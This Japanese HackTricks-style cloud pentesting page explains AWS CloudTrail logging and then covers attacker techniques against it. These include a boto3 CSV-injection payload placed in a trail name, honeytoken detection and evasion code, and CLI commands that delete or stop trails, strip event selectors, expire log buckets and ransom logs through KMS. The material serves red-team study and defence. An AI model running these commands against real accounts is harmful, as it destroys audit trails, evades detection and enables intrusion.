# AWS - CloudTrail Enum

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## **CloudTrail**

AWS CloudTrailは、AWS環境内の活動を**記録し監視します**。これは、AWSリソースとのすべてのやり取りについて、誰がいつどこから何をしたかを含む詳細な**イベントログ**をキャプチャします。これにより、セキュリティ分析、コンプライアンス監査、リソース変更追跡のための変更とアクションの監査証跡が提供されます。CloudTrailは、ユーザーとリソースの振る舞いを理解し、セキュリティ体制を強化し、規制コンプライアンスを確保するために不可欠です。

各ログイベントには以下が含まれます:

* 呼び出されたAPIの名前: `eventName`
* 呼び出されたサービス: `eventSource`
* 時間: `eventTime`
* IPアドレス: `SourceIPAddress`
* エージェントメソッド: `userAgent`。例:
  * Signing.amazonaws.com - AWS管理コンソールから
  * console.amazonaws.com - アカウントのルートユーザー
  * lambda.amazonaws.com - AWS Lambda
* リクエストパラメータ: `requestParameters`
* レスポンス要素: `responseElements`

イベントは**約5分ごとにJSONファイルに書き込まれ**、CloudTrailによって保持され、最終的にログファイルは**約15分後にS3に配信されます**。\
CloudTrailのログは、**アカウントやリージョンを越えて集約することができます**。\
CloudTrailは**ログファイルの完全性を使用して、ログファイルがあなたに配信されてから変更されていないことを検証することができます**。ログ内のSHA-256ハッシュをダイジェストファイル内に作成します。新しいログのsha-256ハッシュは毎時作成されます。\
Trailを作成する際には、イベントセレクターを使用して、管理、データ、またはインサイトイベントのログを記録するように指示できます。

ログはS3バケットに保存されます。デフォルトではサーバーサイド暗号化（SSE-S3）が使用されるため、アクセス権を持つ人々に対してAWSが内容を復号化しますが、追加のセキュリティのためにKMSと独自のキーを使用したSSEを使用することができます。

ログは以下の名前形式の**S3バケットに保存されます**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYYY/MM/DD`**
* BucketNameは: **`aws-cloudtrail-logs-<accountid>-<random>`**
* 例: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

各フォルダ内の各ログは、以下の形式に従って**名前が付けられます**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

ログファイル命名規則

![](<../../../../.gitbook/assets/image (29).png>)

さらに、**ファイルの完全性をチェックするためのダイジェストファイル**は、以下の**同じバケット**内にあります:

![](<../../../../.gitbook/assets/image (22).png>)

### 複数のアカウントからのログの集約

* ログファイルを配信したいAWSアカウントでトレイルを作成する
* CloudTrailへのクロスアカウントアクセスを許可し、アクセスが必要な各AWSアカウントに対して、宛先S3バケットへの権限を適用する
* 他のAWSアカウントで新しいトレイルを作成し、ステップ1で作成したバケットを使用するように選択する

ただし、同じS3バケットにすべてのログを保存できるとしても、複数のアカウントからのCloudTrailログを単一のAWSアカウントに属するCloudWatch Logsに集約することはできません。

{% hint style="danger" %}
アカウントには、同じ（または異なる）ログを異なるバケットに保存する**異なるトレイル**が**有効になっている**可能性があることを覚えておいてください。
{% endhint %}

### すべての組織アカウントから1つにCloudtrail

CloudTrailを作成する際、組織内のすべてのアカウントに対してcloudtrailをアクティブにし、ログを1つのバケットに集約するよう指示することができます:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

この方法では、すべてのアカウントのすべてのリージョンでCloudTrailを簡単に設定し、ログを1つのアカウントに集約することができます（保護する必要があります）。

### ログファイルのチェック

ログが変更されていないことを確認するには、以下を実行します

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### CloudWatchへのログ

**CloudTrailは自動的にCloudWatchにログを送信し、不審な活動が行われたときに警告するアラートを設定できます。**\
CloudTrailがCloudWatchにログを送信するためには、そのアクションを許可する**ロール**の作成が必要です。可能であれば、AWSのデフォルトロールを使用してこれらのアクションを実行することを推奨します。このロールによりCloudTrailは以下を行うことができます：

* CreateLogStream: CloudWatch Logsのログストリームを作成することを許可します
* PutLogEvents: CloudTrailのログをCloudWatch Logsのログストリームに配信します

### イベント履歴

CloudTrailのイベント履歴を使用すると、記録されたログをテーブルで検査できます：

![](<../../../../.gitbook/assets/image (24).png>)

### インサイト

**CloudTrail Insights**は自動的にCloudTrailトレイルからの書き込み管理イベントを**分析**し、**異常な活動**に対して**警告**します。例えば、確立されたベースラインと異なる`TerminateInstance`イベントの増加がある場合、それはインサイトイベントとして表示されます。これらのイベントにより、**異常なAPI活動を見つけて対応することがこれまで以上に容易**になります。

インサイトはCloudTrailログと同じバケットに保存されます：`BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### セキュリティ

| CloudTrailログファイルの完全性        | <ul><li>ログが改ざん（変更または削除）されていないかを検証する</li><li><p>ダイジェストファイルを使用（各ファイルのハッシュを作成）</p><ul><li>SHA-256ハッシング</li><li>デジタル署名のためのSHA-256とRSA</li><li>Amazonが所有するプライベートキー</li></ul></li><li>ダイジェストファイルの作成には1時間かかる（毎時1回実行）</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 不正アクセスの阻止             | <ul><li><p>IAMポリシーとS3バケットポリシーを使用する</p><ul><li>セキュリティチーム —> 管理者アクセス</li><li>監査員 —> 読み取り専用アクセス</li></ul></li><li>ログを暗号化するためにSSE-S3/SSE-KMSを使用する</li></ul>                                                                                                                                        |
| ログファイルの削除を防ぐ | <ul><li>IAMとバケットポリシーで削除アクセスを制限する</li><li>S3 MFA削除を設定する</li><li>ログファイル検証で検証する</li></ul>                                                                                                                                                                                            |

## アクセスアドバイザー

AWS Access Advisorは、過去400日間のAWS **CloudTrailログを使用して洞察を得ます**。CloudTrailはAWSアカウントで行われたAWS APIコールと関連イベントの履歴をキャプチャします。Access Advisorはこのデータを利用して**サービスが最後にアクセスされた時期を表示**します。CloudTrailログを分析することで、IAMユーザーやロールがアクセスしたAWSサービスとそのアクセスがいつ発生したかを特定できます。これにより、AWS管理者は**権限の精査**に関する情報に基づいた決定を下すことができます。長期間アクセスされていないサービスを特定し、実際の使用パターンに基づいて過剰に広範な権限を削減することが可能です。

{% hint style="success" %}
したがって、Access Advisorは**ユーザーに与えられている不要な権限**について情報を提供し、管理者がそれらを削除できるようにします
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## アクション

### 列挙
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSVインジェクション**

CloudTrail内でCSVインジェクションを実行し、ログがCSVでエクスポートされ、Excelで開かれた場合に任意のコードを実行することが可能です。\
以下のコードは、ペイロードを含む不正なTrail名を持つログエントリを生成します：
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
CSVインジェクションについての詳細は、以下のページをご覧ください。

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

この特定の技術についての詳細は、[https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)をご覧ください。

## **検出回避**

### HoneyTokens **回避**

HoneyTokensは**機密情報の流出を検出するために作られます**。AWSの場合、それらは**使用が監視されているAWSキー**です。そのキーで何かがトリガーされた場合、誰かがそのキーを盗んだということです。

しかし、この監視は**CloudTrail**を介して行われ、**CloudTrailにログを送信しないAWSサービス**がいくつかあります（[リストはこちら](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)）。これらのサービスの中には、不正アクセス（honeytokenキー）を試みた場合に、**キーロールのARN**を含む**エラー**で**応答**するものがあります。

この方法で、**攻撃者はログをトリガーすることなくキーのARNを取得できます**。ARNでは、**AWSアカウントIDと名前**が見えるため、HoneyTokenの企業アカウントIDと名前を知るのは簡単です。この方法で攻撃者は、トークンがHoneyTokenかどうかを識別できます。

![](<../../../../.gitbook/assets/image (65).png>)

#### **HoneyTokens 検出**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57)は、キーが[**Canarytokens**](https://canarytokens.org/generate)**、** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**、** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**に属しているかどうかを検出します:**

* ロール名に**`canarytokens.org`**が含まれているか、エラーメッセージにアカウントID **`534261010715`**が含まれている場合。
* 最近のテストでは、彼らはアカウント**`717712589309`**を使用しており、名前には依然として**`canarytokens.com`**の文字列が含まれています。
* エラーメッセージのロール名に**`SpaceCrab`**が含まれている場合
* **SpaceSiren**は**uuids**を使用してユーザー名を生成します: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* **名前がランダムに生成されたように見える**場合、それはHoneyTokenである可能性が高いです。

{% hint style="danger" %}
CloudTrailのログを作成しないと判明したすべての公開APIは現在修正されているため、自分自身で見つける必要があるかもしれません...

または、[**こちらで説明されているように**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)、**アクセスキー**内の**エンコードされた**から**アカウントID**を取得し、Honeytokens AWSアカウントのリストと照合することができます。
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

詳細については、[**オリジナルの研究**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)をご覧ください。

### 第三者のインフラストラクチャへのアクセス

特定のAWSサービスは、**データベース**や**Kubernetes**クラスター（EKS）などのインフラストラクチャを**生成することがあります**。ユーザーがこれらのサービスに**直接通信する**（Kubernetes APIのように）場合、**AWS APIを使用しないため**、CloudTrailはこの通信を検出することができません。

したがって、EKSへのアクセス権を持つユーザーがEKS APIのURLを発見した場合、ローカルでトークンを生成し、**Cloudtrailに検出されることなくAPIサービスと直接通信することができます**。

詳細は以下をご覧ください：

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail設定の変更

#### トレイルの削除
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### トレイルを停止
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### マルチリージョンログの無効化

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### イベントセレクタによるログの無効化

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

最初の例では、JSON配列として単一のイベントセレクタが1つのオブジェクトとして提供されています。`"ReadWriteType": "ReadOnly"`は、**イベントセレクタは読み取り専用のイベントのみをキャプチャするべきである**ことを示しています（つまり、CloudTrailのインサイトは**書き込みイベントをチェックしません**）。

イベントセレクタは、特定の要件に基づいてカスタマイズできます。

#### S3ライフサイクルポリシーによるログ削除

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### バケット設定の変更

* S3バケットを削除する
* CloudTrailサービスからの書き込みを拒否するバケットポリシーを変更する
* オブジェクトを削除するためのライフサイクルポリシーをS3バケットに追加する
* CloudTrailログを暗号化するために使用されるkmsキーを無効にする

### Cloudtrailランサムウェア

#### S3ランサムウェア

非対称キーを**生成**し、そのキーで**CloudTrailがデータを暗号化**させ、プライベートキーを**削除**することで、CloudTrailの内容が回復できなくなります。\
これは基本的に以下で説明されている**S3-KMSランサムウェア**です:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMSランサムウェア**

これは、異なる権限要件を持つ前述の攻撃を実行する最も簡単な方法です:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **参考文献**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
